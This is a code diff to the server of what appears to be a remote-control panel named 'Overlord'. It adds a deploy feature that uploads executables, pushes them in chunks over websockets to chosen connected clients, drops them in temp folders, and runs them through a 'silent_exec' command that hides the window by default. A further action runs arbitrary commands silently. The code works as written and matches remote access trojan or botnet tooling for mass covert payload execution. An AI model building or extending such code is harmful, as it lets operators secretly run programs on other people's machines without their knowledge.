@@ -39,6 +39,8 @@ const MAX_WS_MESSAGE_BYTES_CLIENT = Number(process.env.MAX_WS_MESSAGE_BYTES_CLIE
 const PUBLIC_ROOT = fileURLToPath(new URL("../public", import.meta.url));
 const PLUGIN_ROOT = fileURLToPath(new URL("../plugins", import.meta.url));
 const PLUGIN_STATE_PATH = path.join(PLUGIN_ROOT, ".plugin-state.json");
+const DATA_DIR = process.env.DATA_DIR || "./data";
+const DEPLOY_ROOT = path.join(DATA_DIR, "deploy");
 
 const TLS_CERT_PATH = config.tls.certPath;
 const TLS_KEY_PATH = config.tls.keyPath;
@@ -93,6 +95,17 @@ const pendingPluginEvents = new Map<string, Array<{ event: string; payload: any 
 const pluginLoadingByClient = new Map<string, Set<string>>();
 let pluginState = { enabled: {} as Record<string, boolean>, lastError: {} as Record<string, string> };
 
+type DeployOs = "windows" | "mac" | "linux" | "unix" | "unknown";
+type DeployUpload = {
+  id: string;
+  path: string;
+  name: string;
+  size: number;
+  os: DeployOs;
+};
+
+const deployUploads = new Map<string, DeployUpload>();
+
 type NotificationRecord = {
   id: string;
   clientId: string;
@@ -115,6 +128,52 @@ type NotificationRateState = {
   suppressed: number;
   lastWarned: number;
 };
+
+function normalizeClientOs(os?: string): DeployOs {
+  const val = String(os || "").toLowerCase();
+  if (val.includes("windows")) return "windows";
+  if (val.includes("darwin") || val.includes("mac")) return "mac";
+  if (val.includes("linux")) return "linux";
+  return "unknown";
+}
+
+function detectUploadOs(filename: string, bytes: Uint8Array): DeployOs {
+  const lower = filename.toLowerCase();
+  if (lower.endsWith(".exe") || lower.endsWith(".msi") || lower.endsWith(".bat") || lower.endsWith(".cmd") || lower.endsWith(".ps1")) {
+    return "windows";
+  }
+  if (lower.endsWith(".dmg") || lower.endsWith(".pkg") || lower.endsWith(".app")) {
+    return "mac";
+  }
+  if (lower.endsWith(".sh")) {
+    return "unix";
+  }
+  if (lower.endsWith(".run")) {
+    return "linux";
+  }
+
+  if (bytes.length >= 4) {
+    const b0 = bytes[0];
+    const b1 = bytes[1];
+    const b2 = bytes[2];
+    const b3 = bytes[3];
+    // PE (MZ)
+    if (b0 === 0x4d && b1 === 0x5a) return "windows";
+    // ELF
+    if (b0 === 0x7f && b1 === 0x45 && b2 === 0x4c && b3 === 0x46) return "linux";
+    // Mach-O / Fat binaries
+    const magic = (b0 << 24) | (b1 << 16) | (b2 << 8) | b3;
+    if (magic === 0xfeedface || magic === 0xfeedfacf || magic === 0xcefaedfe || magic === 0xcafebabe) {
+      return "mac";
+    }
+  }
+
+  if (bytes.length >= 2 && bytes[0] === 0x23 && bytes[1] === 0x21) {
+    return "unix";
+  }
+
+  return "unknown";
+}
 
 const notificationHistory: NotificationRecord[] = [];
 const notificationRate = new Map<string, NotificationRateState>();
@@ -2870,6 +2929,166 @@ async function startServer() {
         return Response.json({ ok: true, id: pluginId });
       }
 
+      if (req.method === "POST" && url.pathname === "/api/deploy/upload") {
+        const user = await authenticateRequest(req);
+        if (!user) {
+          return new Response("Unauthorized", { status: 401 });
+        }
+        if (user.role !== "admin") {
+          return new Response("Forbidden: Admin access required", { status: 403 });
+        }
+
+        let form: FormData;
+        try {
+          form = await req.formData();
+        } catch {
+          return new Response("Bad request", { status: 400 });
+        }
+
+        const file = form.get("file");
+        if (!(file instanceof File)) {
+          return new Response("Missing file", { status: 400 });
+        }
+
+        const filename = path.basename(file.name || "upload.bin");
+        const id = uuidv4();
+        await fs.mkdir(DEPLOY_ROOT, { recursive: true });
+        const folder = path.join(DEPLOY_ROOT, id);
+        await fs.mkdir(folder, { recursive: true });
+        const targetPath = path.join(folder, filename);
+        const bytes = new Uint8Array(await file.arrayBuffer());
+        await fs.writeFile(targetPath, bytes);
+
+        const os = detectUploadOs(filename, bytes);
+        const entry: DeployUpload = {
+          id,
+          path: targetPath,
+          name: filename,
+          size: bytes.length,
+          os,
+        };
+        deployUploads.set(id, entry);
+
+        return Response.json({ ok: true, uploadId: id, os, name: filename, size: bytes.length });
+      }
+
+      if (req.method === "POST" && url.pathname === "/api/deploy/run") {
+        const user = await authenticateRequest(req);
+        if (!user) {
+          return new Response("Unauthorized", { status: 401 });
+        }
+        if (user.role !== "admin") {
+          return new Response("Forbidden: Admin access required", { status: 403 });
+        }
+
+        let body: any = {};
+        try {
+          body = await req.json();
+        } catch {
+          return new Response("Bad request", { status: 400 });
+        }
+
+        const uploadId = typeof body?.uploadId === "string" ? body.uploadId : "";
+        const clientIds = Array.isArray(body?.clientIds) ? body.clientIds : [];
+        const args = typeof body?.args === "string" ? body.args : "";
+        const hideWindow = body?.hideWindow !== false;
+        if (!uploadId || clientIds.length === 0) {
+          return new Response("Bad request", { status: 400 });
+        }
+
+        const upload = deployUploads.get(uploadId);
+        if (!upload) {
+          return new Response("Not found", { status: 404 });
+        }
+
+        const bytes = new Uint8Array(await fs.readFile(upload.path));
+        const chunkSize = 16 * 1024;
+        const results: Array<{ clientId: string; ok: boolean; reason?: string }> = [];
+
+        for (const clientId of clientIds) {
+          const target = clientManager.getClient(clientId);
+          if (!target) {
+            results.push({ clientId, ok: false, reason: "offline" });
+            continue;
+          }
+
+          const clientOs = normalizeClientOs(target.os);
+          const osMismatch =
+            upload.os !== "unknown" &&
+            !(
+              upload.os === clientOs ||
+              (upload.os === "unix" && (clientOs === "linux" || clientOs === "mac"))
+            );
+          if (osMismatch) {
+            results.push({ clientId, ok: false, reason: "os_mismatch" });
+            continue;
+          }
+
+          const dir = clientOs === "windows"
+            ? `C:\\Windows\\Temp\\Overlord\\${upload.id}`
+            : `/tmp/overlord/${upload.id}`;
+          const destPath = clientOs === "windows"
+            ? `${dir}\\${upload.name}`
+            : `${dir}/${upload.name}`;
+
+          target.ws.send(
+            encodeMessage({
+              type: "command",
+              commandType: "file_mkdir",
+              id: uuidv4(),
+              payload: { path: dir },
+            }),
+          );
+
+          for (let offset = 0; offset < bytes.length; offset += chunkSize) {
+            const chunk = bytes.subarray(offset, Math.min(offset + chunkSize, bytes.length));
+            target.ws.send(
+              encodeMessage({
+                type: "command",
+                commandType: "file_upload",
+                id: uuidv4(),
+                payload: { path: destPath, data: chunk, offset },
+              }),
+            );
+          }
+
+          if (clientOs !== "windows") {
+            target.ws.send(
+              encodeMessage({
+                type: "command",
+                commandType: "file_chmod",
+                id: uuidv4(),
+                payload: { path: destPath, mode: "0755" },
+              }),
+            );
+          }
+
+          target.ws.send(
+            encodeMessage({
+              type: "command",
+              commandType: "silent_exec",
+              id: uuidv4(),
+              payload: { command: destPath, args, hideWindow },
+            }),
+          );
+
+          metrics.recordCommand("silent_exec");
+          logAudit({
+            timestamp: Date.now(),
+            username: user.username,
+            ip: server.requestIP(req)?.address || "unknown",
+            action: AuditAction.SILENT_EXECUTE,
+            targetClientId: clientId,
+            success: true,
+            details: JSON.stringify({ uploadId, command: destPath, args }),
+          });
+
+          results.push({ clientId, ok: true });
+        }
+
+        return Response.json({ ok: true, results });
+      }
+
       const pluginEnableMatch = url.pathname.match(/^\/api\/plugins\/(.+)\/enable$/);
       if (req.method === "POST" && pluginEnableMatch) {
         const user = await authenticateRequest(req);
@@ -3175,6 +3394,38 @@ async function startServer() {
               } catch (error: any) {
                 return Response.json({ ok: false, error: error.message }, { status: 500 });
               }
+            } else if (action === "silent_exec") {
+              if (user.role !== "admin") {
+                return new Response("Forbidden: Admin access required", { status: 403 });
+              }
+
+              const command = typeof body?.command === "string" ? body.command.trim() : "";
+              const args = typeof body?.args === "string" ? body.args : "";
+              const cwd = typeof body?.cwd === "string" ? body.cwd : "";
+
+              if (!command) {
+                return new Response("Bad request", { status: 400 });
+              }
+
+              const cmdId = uuidv4();
+              target.ws.send(
+                encodeMessage({
+                  type: "command",
+                  commandType: "silent_exec",
+                  id: cmdId,
+                  payload: { command, args, cwd },
+                }),
+              );
+              metrics.recordCommand("silent_exec");
+              logAudit({
+                timestamp: Date.now(),
+                username: user.username,
+                ip,
+                action: AuditAction.SILENT_EXECUTE,
+                targetClientId: targetId,
+                success: true,
+                details: JSON.stringify({ command, args, cwd }),
+              });
             } else if (action === "uninstall") {
               target.ws.send(encodeMessage({ type: "command", commandType: "uninstall", id: uuidv4() }));
               metrics.recordCommand("uninstall");
@@ -3520,6 +3771,26 @@ async function startServer() {
         const file = Bun.file(`${PUBLIC_ROOT}/scripts.html`);
         if (await file.exists()) {
           return new Response(file, { headers: secureHeaders(mimeType("scripts.html")) });
+        }
+      }
+
+      if (req.method === "GET" && url.pathname === "/deploy") {
+        const user = await authenticateRequest(req);
+        if (!user) {
+          const loginFile = Bun.file(`${PUBLIC_ROOT}/login.html`);
+          if (await loginFile.exists()) {
+            return new Response(loginFile, { headers: secureHeaders(mimeType("/login.html")) });
+          }
+          return new Response("Unauthorized", { status: 401 });
+        }
+
+        if (user.role !== "admin") {
+          return new Response("Forbidden: Admin access required", { status: 403 });
+        }
+
+        const file = Bun.file(`${PUBLIC_ROOT}/deploy.html`);
+        if (await file.exists()) {
+          return new Response(file, { headers: secureHeaders(mimeType("deploy.html")) });
         }
       }
 
